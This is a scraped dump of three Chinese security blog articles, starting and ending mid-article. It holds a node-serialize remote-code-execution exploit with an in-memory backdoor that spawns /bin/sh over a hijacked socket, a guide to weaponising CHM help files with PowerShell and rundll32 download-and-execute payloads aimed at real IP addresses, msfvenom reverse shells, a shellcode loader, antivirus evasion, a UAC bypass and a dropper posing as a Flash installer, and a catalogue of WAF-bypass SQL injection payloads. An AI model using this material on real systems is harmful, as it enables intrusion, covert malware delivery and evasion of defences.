hack，而不需要 Python 阶段的攻击。那么我就要写一下代码了，可能会修改有效的 exploit，使其更易用一些。那么我们可以使用变量选项，将代码设置为一个叫 code 的变量。它存储我们的代码，我们不必担心编码问题。仅需修改 cookie 中的 profile ，以便将变量嵌入 JSON ，然后 node-serialize 执行特定的函数。很漂亮！现在我们每次更改code 变量时，profile cookie payload 将通过编码链和 node-serialize 神奇的完美运行。内存后门现在要对我们的代码 payload 进行处理。假设我们不知道程序是如何运行的，我们需要一个通用的利用方法，或者多用任何其他应用，没有安装环境和其它预习过的知识。这要求我们不能依赖可能存在的全局范围变量。我们也不能依赖 express 应用已经导出的变量，那么可以访问其他要安装的路由来进行访问。我不想生成新的端口或反向 shell，而要保持 profile 为最小的状态。这是个很大的需求，但进行一些研究后，很容易找到一种可行的方法。我们从 http 模块引用 ServerResponse 函数开始。ServerResponse 的属性用于 expressjs 中 response 对象的 __proto__。/** * Response prototype. */var res = module.exports = {    __proto__: http.ServerResponse.prototype};这意味着如果我们更改 ServerResponse 的 原型（prototype），对应的 __proto__ 属性。来自响应的 send 方法会调用 ServerResponse 的 prototype。if (req.method === 'HEAD') {    // skip body for HEAD  this.end();} else {  // respond  this.end(chunk, encoding);}一旦 send 方法被调用， end 方法将被调用，而它恰好是来自 ServerResponse 的 prototype。由于 send 方法大量用于 expressjs 相关的东西，这就意味着我们可以更直接地访问更有趣的结构，比如打开当前的 socket。如果我们覆写 prototype 的 end 方法，我们便可以通过 this 引用获取对 socket 对象的引用。实现这种效果的代码如下：require('http').ServerResponse.prototype.end = (function (end) {    return function () {    // TODO: this.socket gives us the current open socket  }})(require('http').ServerResponse.prototype.end)由于我们覆盖了 end 的原型（prototype），我们还需要某种方式区分我们的启动请求和其他正常请求，以免产生意外。我们可以通过查询参数包含的特殊字符串（abc123），以区分是否是来自自己的恶意请求。可以从 socket 的 httpMessage 对象获取此信息。如下所示：require('http').ServerResponse.prototype.end = (function (end) {    return function () {    // TODO: this.socket._httpMessage.req.query give us reference to the query  }})(require('http').ServerResponse.prototype.end)一切就绪。剩下的就是启动 shell 了，这在 node 中相当简单。var cp = require('child_process')  var net = require('net')net.createServer((socket) =&gt; {      var sh = cp.spawn('/bin/sh')    sh.stdout.pipe(socket)    sh.stderr.pipe(socket)    socket.pipe(sh.stdin)}).listen(5001)合并上述两个段，最终代码如下。注意我们这里通过已经建立的 socket 来重定向 end 函数，其中 node 产生了一个 shell。这很纯粹。require('http').ServerResponse.prototype.end = (function (end) {    return function () {    if (this.socket._httpMessage.req.query.q === 'abc123') {        var cp = require('child_process')        var net = require('net')        var sh = cp.spawn('/bin/sh')        sh.stdout.pipe(this.socket)        sh.stderr.pipe(this.socket)        this.socket.pipe(sh.stdin)    } else {        end.apply(this, arguments)    }  }})(require('http').ServerResponse.prototype.end)现在 nc localhost 3000，然后输入以下请求内容：$ nc localhost 3000GET /?q=abc123 HTTP/1.1ls -la  什么？你啥也没得到？这只是个小把戏，我分开讲了。你看，我们正在劫持一个现有的 socket，因此我们不是它的唯一接管人。还有其他的东西可能会影响 socket，所以对于其他情况应小心考虑。还好很容易实现这一点，最终的代码如下：require('http').ServerResponse.prototype.end = (function (end) {    return function () {    if (this.socket._httpMessage.req.query.q === 'abc123') {        ['close', 'connect', 'data', 'drain', 'end', 'error', 'lookup', 'timeout', ''].forEach(this.socket.removeAllListeners.bind(this.socket))        var cp = require('child_process')        var net = require('net')        var sh = cp.spawn('/bin/sh')        sh.stdout.pipe(this.socket)        sh.stderr.pipe(this.socket)        this.socket.pipe(sh.stdin)    } else {        end.apply(this, arguments)    }  }})(require('http').ServerResponse.prototype.end)最后，可以根据自己的喜好自由发挥了。可以通过相同的服务器进程，建立 socket 打开具有特殊字符串的请求来获取远程 shell。结论我们从一个简单的 RCE 开始，最终生成了一个通用的 HTTP 通道的 shell，可以应对多种情况。整个过程利用 Rest 工具变得非常简单。顺便推荐前几篇文章：1，2，3","2017-02-16 20:28:22","Web安全","HACKING NODE SERIALIZE - 进一步利用 Node.JS 代码执行漏洞","http://nsoad.com/Article/web/20170216/1064.html"
"5ccbfada4f2f0a0a7a69c0d0","序某日嶽兄激动的说他的chm自动反弹shell做好了，急匆匆的拿我们测试，结果&hellip;一定是出bug了，我看了下演示(对不起，我实在编不下去了)。文章给出最终版代码，测试的心","kong","序某日嶽兄激动的说他的chm自动反弹shell做好了，急匆匆的拿我们测试，结果…一定是出bug了，我看了下演示(对不起，我实在编不下去了)。文章给出最终版代码，测试的心酸撸主右手可以作证。  第一章 CHM社工 当ithurricanept在发twitter的时候估计我在东北玩泥巴，看了Demo吓得我赶紧注册了个twitter并且Follow了TA。Demo代码应该是这样的：&lt;OBJECT id=xclassid=""clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11"" width=1height=1&gt;&lt;PARAM name=""Command""value=""ShortCut""&gt;&lt;PARAM name=""Button""value=""Bitmap::shortcut""&gt;&lt;PARAM name=""Item1""value=',calc.exe'&gt;&lt;PARAM name=""Item2""value=""273,1,1""&gt;&lt;/OBJECT&gt;&lt;SCRIPT&gt;x.Click();&lt;/SCRIPT&gt;打开该CHM文件即弹出计算器，之后Samratashok也推出了他的Out-CHM（使用参数HHCPath指定自己的hhc路径），使用CHM执行powershell脚本，但唯一不足就是会弹出黑框。PS D:\nishang\Client&gt; Import-Module.\Out-CHM.ps1PS D:\nishang\Client&gt; get-help Out-CHM -examplesPS D:\nishang\Client &gt;Out-CHM-PayloadURL http://192.168.254.1/Get-Information.ps1 -HHCPath "" C:\ProgramFiles (x86)\HTML Help Workshop""##反编译CHMhh -decompile test doc.chm ##Out-CHM PAYLOAD &lt;OBJECT id=x classid=""clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11""width=1 height=1&gt;&lt;PARAM name=""Command"" value=""ShortCut""&gt;&lt;PARAM name=""Button"" value=""Bitmap::shortcut""&gt;&lt;PARAM name=""Item1"" value="",cmd.exe,/cC:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden-ExecutionPolicy Bypass -NoLogo -NoProfile IEX ((New-ObjectNet.WebClient).DownloadString('http://192.168.254.1/Get-Information.ps1'));""&gt;&lt;PARAM name=""Item2""value=""273,1,1""&gt;&lt;/OBJECT&gt; &lt;SCRIPT&gt;x.Click();&lt;/SCRIPT&gt; ##有用链接ithurricanepthttps://twitter.com/ithurricanept/status/534993743196090368HTML Help Workshophttp://www.microsoft.com/en-us/download/details.aspx?id=21138nishang https://github.com/samratashok/nishang 第二章讨厌的黑框nishang的黑框真的很让人捉急，不知道他找到解决办法了没，但是国内聪明的Evi1cg在某个晚上突然就想到了，反正他是这么说的。通过rundll32.exe执行jsrundll32.exejavascript:""\..\mshtml,RunHTMLApplication "";alert('foo');Rundll32漏洞配合JSRAT做出了近乎完美的后门，写入注册表即可实现开机启动。注册脚本组件regsvr32.exe /u /n /s/i:http://10.10.10.10:31337/file.sct scrobj.dll ##有用链接evi1cghttp://evi1cg.me/archives/chm_backdoor.html从恶意软件获得的新姿势—通过rundll32.exe执行js原理详细分析http://bobao.360.cn/learning/detail/164.htmlJSRathttps://github.com/Hood3dRob1n/JSRat-Py第三章强大的Powershell但是我只想用它来下载一个后门并执行，于是乎开始了各种折腾。首先测试powershell的下载执行，然后嵌入rundll32测试，最后生成CHM再测试。 ##Powershell下载并执行powershell -WindowStyle hidden -nologo -noprofile-ep bypass IEX(New-Object Net.WebClient).DownloadFile('http://xxx.xxx.xxx.xxx/sn.exe','..\\sn.exe');&amp;cmd/c ..\\sn.exePowershell的下载可谓是五花八门，最后我还是选择了常用的DownloadFile()，将文件下载到上层目录（当C:\没有权限时powershell就会将文件直接下载到用户当前目录下；env:\temp环境变量在低版本powershell中没有；start-process -nonewwindow ‘sn.exe’似乎不等待下载完成便会调用），并通过&amp;符号连接命令运行下载的程序。 ##嵌入rundll32rundll32.exe,javascript:""\..\mshtml,RunHTMLApplication"";document.write();r=new%20ActiveXObject(""WScript.Shell"").run(""powershell-WindowStyle hidden -nologo -noprofile -ExecutionPolicy Bypass IEX (New-ObjectNet.WebClient).DownloadFile(""http://139.129.21.79/sn.exe"",""..\\sn.exe"");&amp;cmd/c ..\\sn.exe"",0,true);##生成CHM&lt;OBJECT id=xclassid=""clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11"" width=1height=1&gt;&lt;PARAM name=""Command""value=""ShortCut""&gt;&lt;PARAM name=""Button""value=""Bitmap::shortcut""&gt;&lt;PARAM name=""Item1""value=',rundll32.exe,javascript:""\..\mshtml,RunHTMLApplication"";document.write();r=new%20ActiveXObject(""WScript.Shell"").run(""powershell-WindowStyle hidden -nologo -noprofile -ExecutionPolicy Bypass IEX (New-ObjectNet.WebClient).DownloadFile('http://211.137.203.76/flashplayer23_ha_install.exe&amp;#39;,'..\\setup.exe');&amp;cmd/c ..\\setup.exe"",0,true);'&gt;&lt;PARAM name=""Item2""value=""273,1,1""&gt;&lt;/OBJECT&gt; &lt;SCRIPT&gt;x.Click();&lt;/SCRIPT&gt; 单双引号真的会把人逼疯的，在CHM中需用’代替双引号，尝试使用base64编码powershell命令，但是嵌入rundll32测试语法错误，一时无解。##有用链接 第四章 msf后门升级CHM做好了，下面制作后门。开始选用新版cobaltstrike的DNS上线，结果域名测试都没问题，生的的马儿就是不上线，无奈放弃。最后选择msf的reverse_tcp。生成马儿msfvenom -a x86 --platform windows -p windows/shell/reverse_tcplhost=192.168.6.12 lport=80 EXITFUNC=thread -e x86/shikata_ga_nai -b '\x00' -i3 -f exe -o /tmp/bdoor.exe 生成shellcodemsfvenom -a x86 --platform windows -p windows/shell/reverse_tcp lhost=192.168.6.12 lport=80 -e x86/shikata_ga_nai -b'\x00' -i 3 -f c##免杀OWASP-ZSC可以生成下载执行，添加用户，创建文件等的shellcode；听说你可以混淆代码，原来只支持javascript perl php python ruby，更别说混淆现有shellcode了；https://github.com/zscproject/OWASP-ZSCVeil-Evasion使用现有payload一键生成可执行文件。有c，python，go，ruby的meterpreter反弹后门，go和python生成的可执行文件高大4M，还不如自己使用python ctypes加载shellcode，生成exe，实用价值不大。https://www.veil-framework.com/framework/veil-evasion/C加载shellcode传说中的C语言执行shellcode的五种方法只能在VC6.0下通过，VS用户真的伤不起。 VC6.0main(){( (void(*)(void))&amp;shellcode )(); }VS下#include &lt;Windows.h&gt;#include &lt;string.h&gt;#include &lt;stdio.h&gt;unsigned char shellcode2[] =         ""\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30""         ""\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"";int main(){         PVOIDp;         p= VirtualAlloc(NULL,sizeof(shellcode),MEM_COMMIT,PAGE_EXECUTE_READWRITE);         if(p != NULL){                  //printf(""allocok"");                  if(memcpy(p,shellcode,sizeof(shellcode))){                          //printf(""cpok"");                          //CreateThread(NULL,0, (LPTHREAD_START_ROUTINE )p, NULL, 0, NULL);                          __asm                          {                                   moveax,p;                                   jmpeax;                          }                  }         }}话说前两天有人发了（TM后来360也杀了），别紧张，那不是我。msf后面免杀方式多样，但一般也不外乎以下几点。1，静态文件特征免杀msfvenom -l encoders提供了多种编码方式，x86/shikata_ga_nai仍是目前excellent。但你一定会喜欢上Unest二进制代码混淆器的。2，行为查杀Cobaltstrike http上线方式请求的页面有固定格式，msf对传输的数据可以异或或者加密。3，内存查杀其后我将其做成管理员组用户执行直接绕过UAC自动安装成服务，启动延时3分钟（主要是开机的时候可能还没网，连接不成功便会结束程序），在执行绕UAC时system(“cmd.exe /c eventvwr.exe”);时有黑框，使用CreateProcess API创建这个进程。http://www.virustotal.com扫描仅F-PROT报毒(这应该是个梗)。使用自解压程序安装服务话说360看到是自解压程序就杀，果然是这样的。 ##自解压程序折腾之静默模式1， 首先能想到的就是winrar，但是winrar自解压换个ico你都杀，一会儿杀一会儿不杀的尿性始终没变；2， 只要是加UPX壳就杀；3， IExpress 打包啥都杀；4， 7-ZIP SFX 自解压；5， makesfx.exe 新版真心好用，测试一会儿直接杀；6， ZIP 2 Secure EXE 用起来满满的心累；         7， WinZip Self-Extractor 完成后必须弹框是什么意思？8， 其他方式最后还是选用rar的自解压，下载英文版各版本winrar，安装后复制里面的Default.SFX和rar.exe保存，使用不通的rar版本生成自解压程序。##自解压文件制作创建Silent.sfx静默安装配置文件，其实就是注释啦。程序传入bypass参数绕过UAC并安装服务    Setup=wdevmtsvc.exe bypassTempModeSilent=1Overwrite=2命令行生成自解压文件rar.exe a -r -ep1 -sfx-zSilent.sfx flashplayer23_ha_install.exe wdevmtsvc.exe我以为到这里就完了，结果…##有用链接    Creating a Self-Extracting Setup ExecutableFilehttps://msdn.microsoft.com/en-us/library/aa244282%28v=vs.60%29.aspxmakesfxhttp://74.cz/en/make-sfx/index.phpWindows-Services-Applicationhttps://github.com/ru0/Windows-Services-Application第五章 WSC朋友说吓了一大跳，等了半天也没见上线。再次本地测试，发现powershell被360卫士给拦截了，尼玛，这是啥时候开始的?无奈，为了过360只能抛弃powershell下载，使用wsc下载执行。Windows Script Components (WSC)，以前称为Scriplets，是一种以容易的方式开发强大的COM组件的技术。 WSC可以用任何实现了ActiveX脚本接口的脚本语言来编写，这意味着PerlScript代码单元可以封装为Windows脚本组件。Tips：当你开始看WSC的时候可能会被它繁多的标签搞得云里雾里，你可以使用scriptwz.exe向导生成wsc文件，或者过一阵子再看。##通过wsc启动计算器test.wsc文件&lt;?xml version=""1.0""?&gt;&lt;component&gt;&lt;script language=""JScript""&gt;&lt;![CDATA[newActiveXObject(""WScript.Shell"").Run(""calc.exe""); ]]&gt;&lt;/script&gt;&lt;/component&gt;1.js文件GetObject(""script:C:\\test.wsc"");执行jscscript 1.js   加载远程wsc，当然你也可以将下载js代码写在CHM里面，不过使用wsc代码更简洁并且可以及时更新下载程序。GetObject(""script:http://xxx.xxx.xxx.xxx/test.wsc"")##下载并执行wsc脚本&lt;?xml version=""1.0""?&gt;&lt;component&gt; &lt;?component error=""false""debug=""false""?&gt; &lt;script language=""JScript""&gt;&lt;![CDATA[ function getFile(strURL){         varstrResult;                 try{                  varWinHttpReq = new ActiveXObject(""WinHttp.WinHttpRequest.5.1"")                  WinHttpReq.Open(""GET"",strURL,false);                  WinHttpReq.Send();                  WinHttpReq.WaitForResponse();                  strResult= WinHttpReq.ResponseBody;         }         catch(objError){}         returnstrResult;} var s = new ActiveXObject(""ADODB.Stream"");var md = newActiveXObject(""WScript.Shell"").SpecialFolders(""MyDocuments"");md +=""\\flashplayer23_ha_install.exe"";s.Mode=3;s.Type=1;s.Open();try{         s.Write(getFile(""http://xxx.xxx.xxx.xxx/flashplayer23_ha_install.exe""));         s.SaveToFile(md,2);}catch(err){}s.Close();try{         newActiveXObject(""WScript.Shell"").Run(md);}catch(err){} ]]&gt;&lt;/script&gt; &lt;/component&gt;##嵌入rundll32中rundll32.exe javascript:""\..\mshtml,RunHTMLApplication"";document.write();GetObject(""script:https://xxx.xxx.xxx.xxx/test.wsc""); ##CHM PAYLOAD&lt;OBJECT id=xclassid=""clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11"" width=1height=1&gt;&lt;PARAM name=""Command""value=""ShortCut""&gt; &lt;PARAMname=""Button"" value=""Bitmap::shortcut""&gt; &lt;PARAM name=""Item1""value=',rundll32.exe,javascript:""\..\mshtml,RunHTMLApplication"";document.write();try{GetObject(""script:https://xxx.xxx.xxx.xxx/test.wsc"");}catch(e){new%20ActiveXObject(""WScript.Shell"").Run(""cmd/c taskkill /f /im rundll32.exe"",0,true);}'&gt; &lt;PARAM name=""Item2""value=""273,1,1""&gt;&lt;/OBJECT&gt; &lt;SCRIPT&gt;x.Click();&lt;/SCRIPT&gt;用我改版的makeCHM.ps1直接生成CHM文件.\makeCHM.ps1 -FileName test.htm实际打点效果（windows/shell/reverse_tcp 连接容易失去响应）##有用链接     Windows Script Components (WSC)http://www.xav.com/perl/Windows/windows_script_components.htmlRegistering a Script Componenthttps://msdn.microsoft.com/en-us/library/zt97f40t%28v=vs.84%29.aspxru0 s githubhttps://github.com/ru0陌1，如何对CHM后门检测。     2，msf虽然简单易用，但是没有会话控制，很容易丢失目标，后期可以考虑自写回连shell代码。3，对于“没给钱”的服务360卫士检测为“无需启动的程序”。4，自解压逃不过360sd，考虑自写解压程序或者修改服务程序。5，若有纰漏,还望指正。","2016-11-17 19:05:33","系统安全","CHM渗透：从入门到“入狱”","http://nsoad.com/Article/system/20161117/798.html"
"5ccbfada4f2f0a0a7a69c0d1","当我们遇到一个waf时，要确定是什么类型的？先来看看主流的这些waf，狗、盾、神、锁、宝、卫士等等。。。（在测试时不要只在官网测试，因为存在版本差异导致规则库并不一致）","Kong","0x00 前言去年到现在就一直有人希望我出一篇关于waf绕过的文章，我觉得这种老生常 谈的话题也没什么可写的。很多人一遇到waf就发懵，不知如何是好，能搜到的各 种姿势也是然并卵。但是积累姿势的过程也是迭代的，那么就有了此文，用来总 结一些学习和培养突破waf的思想。可能总结的并不全，但目的并不是讲那些网上 搜来一大把的东西，So…并不会告诉大家现有的姿势，而是突破Waf Bypass思维定势达到独立去挖掘waf的设计缺陷和如何实现自动化的Waf Bypass（这里只讲主流 waf的黑盒测试）0x01 搞起当我们遇到一个waf时，要确定是什么类型的？先来看看主流的这些waf，狗、盾、神、锁、宝、卫士等等。。。（在测试时不要只在官网测试，因为存在版本差异导致规则库并不一致）云waf在配置云waf时（通常是CDN包含的waf），DNS需要解析到CDN的ip上去，在请求uri时，数据包就会先经过云waf进行检测，如果通过再将数据包流给主机。主机防护软件在主机上预先安装了这种防护软件，可用于扫描和保护主机（废话），和监听web端口的流量是否有恶意的，所以这种从功能上讲较为全面。这里再插一嘴，mod_security、ngx-lua-waf这类开源waf虽然看起来不错，但是有个弱点就是升级的成本会高一些。硬件ips/ids防护、硬件waf（这里先不讲）使用专门硬件防护设备的方式，当向主机请求时，会先将流量经过此设备进行流量清洗和拦截，如果通过再将数据包流给主机。再来说明下某些潜规则（关系）：百度云加速免费版节点基于CloudFlare安全宝和百度云加速规则库相似创宇云安全和腾讯云安全规则库相似腾讯云安全和门神规则库相似硬件waf自身漏洞往往一大堆当Rule相似时，会导致一个问题，就比如和双胞胎结婚晓得吧？嗯。0x02 司空见惯我们还需要把各种特性都记牢，在运用时加以变化会很有效果。数据库特性注释：#-- -- - --+ // /**/ /*letmetest*/ ;利用注释简单绕过云锁的一个案例：拦截的，但/**/ &gt; 1个就可以绕过了，也就是/**//**/以上都可以。科学记数法：空白字符：    SQLite3 0A 0D 0C 09 20    MySQL5 09 0A 0B 0C 0D A0 20    PosgresSQL 0A 0D 0C 09 20    Oracle 11g 00 0A 0D 0C 09 20    MSSQL 01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20+号:-号:``符号：~号：!号：@`形式`：点号.1：单引号双引号：括号select(1)：试试union(select)云盾会不会拦截花括号：这里举一个云盾的案例，并附上当时fuzz的过程：        union+select 拦截    select+from 不拦截    select+from+表名 拦截    union(select) 不拦截    所以可以不用在乎这个union了。    union(select user from ddd) 拦截    union(select%0aall) 不拦截    union(select%0aall user from ddd) 拦截    fuzz下select%0aall与字段之间 + 字段与from之间 + from与表名之间 + 表名与末尾圆括号之间可插入的符号。    union(select%0aall{user}from{ddd}) 不拦截。Bypass Payload：    1 union(select%0aall{x users}from{x ddd})    1 union(select%0adistinct{x users}from{x ddd})    1 union(select%0adistinctrow{x users}from{x ddd})可运用的sql函数&amp;关键字：    MySQL：    union distinct    union distinctrow    procedure analyse()    updatexml()    extracavalue()    exp()    ceil()    atan()    sqrt()    floor()    ceiling()    tan()    rand()    sign()    greatest()    字符串截取函数    Mid(version(),1,1)    Substr(version(),1,1)    Substring(version(),1,1)    Lpad(version(),1,1)    Rpad(version(),1,1)    Left(version(),1)    reverse(right(reverse(version()),1)    字符串连接函数    concat(version(),'|',user());    concat_ws('|',1,2,3)    字符转换    Char(49)    Hex('a')    Unhex(61)    过滤了逗号    (1)limit处的逗号：    limit 1 offset 0    (2)字符串截取处的逗号    mid处的逗号：    mid(version() from 1 for 1)    MSSQL：    IS_SRVROLEMEMBER()    IS_MEMBER()    HAS_DBACCESS()    convert()    col_name()    object_id()    is_srvrolemember()    is_member()    字符串截取函数    Substring(@@version,1,1)    Left(@@version,1)    Right(@@version,1)    (2)字符串转换函数    Ascii('a') 这里的函数可以在括号之间添加空格的，一些waf过滤不严会导致bypass    Char('97')    execMysql BIGINT数据类型构造溢出型报错注入： BIGINT Overflow Error Based SQL Injection http://www.thinkings.org/2015/08/10/bigint-overflow-error-sqli.html容器特性%特性：asp+iis的环境中，当我们请求的url中存在单一的百分号%时，iis+asp会将其忽略掉，而没特殊要求的waf当然是不会的：修复方式应该就是检测这种百分号%的周围是否能拼凑成恶意的关键字吧。%u特性：iis支持unicode的解析，当我们请求的url存在unicode字符串的话iis会自动将其转换，但waf就不一定了：修复过后：这个特性还存在另一个case，就是多个widechar会有可能转换为同一个字符。    s%u0065lect-&gt;select    s%u00f0lect-&gt;selectWAF对%u0065会识别出这是e，组合成了select关键字，但有可能识别不出%u00f0其实不止这个，还有很多类似的：   字母a：    %u0000    %u0041    %u0061    %u00aa    %u00e2    单引号：    %u0027    %u02b9    %u02bc    %u02c8    %u2032    %uff07    %c0%27    %c0%a7    %e0%80%a7    空白：    %u0020    %uff00    %c0%20    %c0%a0    %e0%80%a0    左括号(：    %u0028    %uff08    %c0%28    %c0%a8    %e0%80%a8    右括号)：    %u0029    %uff09    %c0%29    %c0%a9    %e0%80%a9畸形协议&amp;请求：asp/asp.net：还有asp/asp.net在解析请求的时候，允许application/x-www-form-urlencoded的数据提交方式，不管是GET还是POST，都可正常接收，过滤GET请求时如果没有对application/x-www-form-urlencoded提交数据方式进行过滤，就会导致任意注入。php+Apache：waf通常会对请求进行严格的协议判断，比如GET、POST等，但是apache解析协议时却没有那么严格，当我们将协议随便定义时也是可以的：PHP解析器在解析multipart请求的时候，它以逗号作为边界，只取boundary，而普通解析器接受整个字符串。 因此，如果没有按正确规范的话，就会出现这么一个状况：首先填充无害的data，waf将其视为了一个整体请求，其实还包含着恶意语句。    ------,xxxx    Content-Disposition: form-data; name=""img""; filename=""img.gif""    GIF89a    ------    Content-Disposition: form-data; name=""id""    1' union select null,null,flag,null from flag limit 1 offset 1-- -    --------    ------,xxxx--通用的特性：HPP：HPP是指HTTP参数污染-HTTP Parameter Pollution。当查询字符串多次出现同一个key时，根据容器不同会得到不同的结果。假设提交的参数即为：id=1&amp;id=2&amp;id=3   Asp.net + iis：id=1,2,3    Asp + iis：id=1,2,3    Php + apache：id=3双重编码：这个要视场景而定，如果确定一个带有waf的site存在解码后注入的漏洞的话，会有效避过waf。    unlencode    base64    json    binary    querystring    htmlencode    unicode    php serialize我们在整体测试一个waf时，可测试的点都有哪些？GET、POST、HEADER那么我们专门针对一个waf进行测试的时候就要将这几个点全测试个遍，header中还包括Cookie、X-Forwarded-For等，往往除了GET以外其他都是过滤最弱的。0x03 见招拆招“正则逃逸大法”：或许大家没听说过这个名词，因为是我起的。我发现很多waf在进行过滤新姿势的时候很是一根筋，最简单的比方，过滤了%23%0a却不过滤%2d%2d%0a？上面提到八成的waf都被%23%0a所绕过。科学计数法1union、1from？多次被坑的安全宝&amp;百度云加速&amp;Imperva：过滤了union+select+from，那我select+from+union呢？使用Mysql自定义变量的特性就可以实现，这里举一个阿里云盾的案例：由于后面在调用自定义变量的时候需要用到union+select，所以还需要绕过这个点。/*ddd*/union/*ddd*/select 就可以了。Bypass Payload：如何做到通过推理绕过waf？这里举一个腾讯云安全的案例：绕过思路: 首先看看腾讯云安全怎么检测sql注入的，怎么匹配关键字会被拦截，怎么匹配不会?union+select拦截select+from拦截union+from不拦截那么关键的点就是绕过这个select关键字select allselect distinctselect distinctrow既然这些都可以，再想想使用这样的语句怎么不被检测到？select与all中间肯定不能用普通的/**/这种代替空格，还是会被视为是union+select。select all可以这么表达/*!12345select all*/，腾讯云早已识破这种烂大街的招式。尝试了下/*!*/中间也可以使用%0a换行。/*!12345%0aselect%20all*/还是会被拦截，这就说明腾讯云在语法检测的时候会忽略掉数字后面的%0a换行，虽然属于union+12342select，但简单的数字和关键字区分识别还是做得到。再测试/*!12345select%0aall*/，结果就合乎推理了，根据测试知道腾讯云安全会忽略掉%0a换行，这就等于union+12345selectall， 不会被检测到。（忽略掉%0a换行为了过滤反而可以用来加以利用进行Bypass）可能会问，推理的依据并不能真正意义上证明忽略掉了%0a啊？当然要证明下啊，/*!12345%0aselect%0aall*/就被拦截了，说明刚开始检测到12345%0aselect就不再检测后方的了，union+12345select就已经可以拦截掉了。还可能会问，既然忽略掉了%0a，那么/*!select%0aall*/是不是也可以啊，然而并不行。合理的推理很有必要。Bypass Payload:    1' union/*!50000select%0aall*/username from users%23    1' union/*!50000select%0adistinct*/username from users%23    1' union/*!50000select%0adistinctrow*/username from users%23不是绕不过狗，只是不够细心：    union+select拦截。    select+from拦截。    union+from不拦截。    fuzz了下/*!50000select*/这个5位数，前两位数&lt;50 &amp;&amp; 第二位!==0 &amp;&amp; 后三位数==0即可bypass。(一点细节也不要放过。)测试环境Windows Server 2008 + APACHE + PHP + Mysql Bypass Payload:    1' union/*!23000select*/user,password from users%23这里证明一个观点：好姿势不是死的，零零碎碎玩不转的姿势巧妙的结合一下。所以说一个姿势被拦截不代表就少了一个姿势。0x04 别按套路出牌云锁版本迭代导致的 &amp; 360主机卫士一直存在的问题：注意POST那个方向，waf在检测POST传输的数据过程中，没有进行URL的检测，也就是说waf会认为URL上的任何参数信息都是正常的。既然是POST请求，那就只检测请求正文咯。(神逻辑)在标准HTTP处理流程中，只要后端有接收GET形式的查询字段，即使客户端用POST传输，查询字符串上满足查询条件时，是会进行处理的。（没毛病）当waf成了宕机的罪魁祸首是什么样的？举一个安全狗的案例：/*66666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666*/注释中包含超长查询字符串，导致安全狗在识别的过程中挂掉了，连带着整个机器Service Unavailable：再举一个云锁也是因为数据包过长导致绕过的案例：云锁在开始检测时先判断包的大小是否为7250byte以下，n为填充包内容，设置n大小为2328时，可以正常访问页面，但是会提示拦截了SQL注入当数据包超过2329时就可以成功绕过，2329长度以后的就不检测了。？0x05 猥琐很重要这里讲个有意思的案例，并且是当时影响了安全宝、阿里云盾的姿势：有次睡前想到的，emoji图标！是的，平时做梦并没有美女与野兽。当时只是随便一想，第二天问了5up3rc，他说他也想过，但测试并没有什么效果emoji是一串unicode字集组成，一个emoji图标占5个字节，mysq也支持emoji的存储，在mysql下占四个字节:既然在查询的时候%23会忽略掉后面的，那么Emoji就可以插入到%23与%0A之间。再加多试了试，成功绕过了，200多个emoji图标，只能多，但少一个都不行。。。可能会说，这是因为超⻓查询导致的绕过吧?并不是。这么⻓，mysql也是会执行的:我们再来测试阿里云盾：当缩少emoji数量的话会拦截，想想还是再加多些试试:还是拦截，那刚才的没拦截是怎么回事?点根烟，逐一进行排查。发现能绕过的原因和emoji数量无关，而是某个emoji可以。就是这个愤怒的emoji，其他的emoji都不行。唯独愤怒脸可以:将这些emoji进行urlencode看看特征，究竟是什么原因?看看哪些emoji插入不会被拦截:有些emoji进行urlencode后是很⻓的，因为是几个emoji进行组合的。将这些payload进行注入进去。难道只有这个愤怒脸插入进去就可以绕过?也不能这么说，我发现能绕过的字符都是ascii码超过了127的字符：那为什么愤怒脸的emoji可以?这里提到emoji的特征，常⻅的emoji是四位组成，前三位多数是一致的，把这三位插入payload试试:可以实现绕过，再来看看愤怒脸的urlencode:最后一位是%a0，那么也就是说完全可以忽略掉最后一位，而多数emoji第四位是 ascii 127的字符，会导致waf引擎无法检测。0x06 自动化Bypass首先总结下sqlmap的各种bypass waf tamper：    apostrophemask.py 用UTF-8全角字符替换单引号字符    apostrophenullencode.py 用非法双字节unicode字符替换单引号字符    appendnullbyte.py 在payload末尾添加空字符编码    base64encode.py 对给定的payload全部字符使用Base64编码    between.py 分别用“NOT BETWEEN 0 AND #”替换大于号“&gt;”，“BETWEEN # AND #”替换等于号“=”    bluecoat.py 在SQL语句之后用有效的随机空白符替换空格符，随后用“LIKE”替换等于号“=”    chardoubleencode.py 对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）    charencode.py 对给定的payload全部字符使用URL编码（不处理已经编码的字符）    charunicodeencode.py 对给定的payload的非编码字符使用Unicode URL编码（不处理已经编码的字符）    concat2concatws.py 用“CONCAT_WS(MID(CHAR(0), 0, 0), A, B)”替换像“CONCAT(A, B)”的实例    equaltolike.py 用“LIKE”运算符替换全部等于号“=”    greatest.py 用“GREATEST”函数替换大于号“&gt;”    halfversionedmorekeywords.py 在每个关键字之前添加MySQL注释    ifnull2ifisnull.py 用“IF(ISNULL(A), B, A)”替换像“IFNULL(A, B)”的实例    lowercase.py 用小写值替换每个关键字字符    modsecurityversioned.py 用注释包围完整的查询    modsecurityzeroversioned.py 用当中带有数字零的注释包围完整的查询    multiplespaces.py 在SQL关键字周围添加多个空格    nonrecursivereplacement.py 用representations替换预定义SQL关键字，适用于过滤器    overlongutf8.py 转换给定的payload当中的所有字符    percentage.py 在每个字符之前添加一个百分号    randomcase.py 随机转换每个关键字字符的大小写    randomcomments.py 向SQL关键字中插入随机注释    securesphere.py 添加经过特殊构造的字符串    sp_password.py 向payload末尾添加“sp_password” for automatic obfuscation from DBMS logs    space2comment.py 用“/**/”替换空格符    space2dash.py 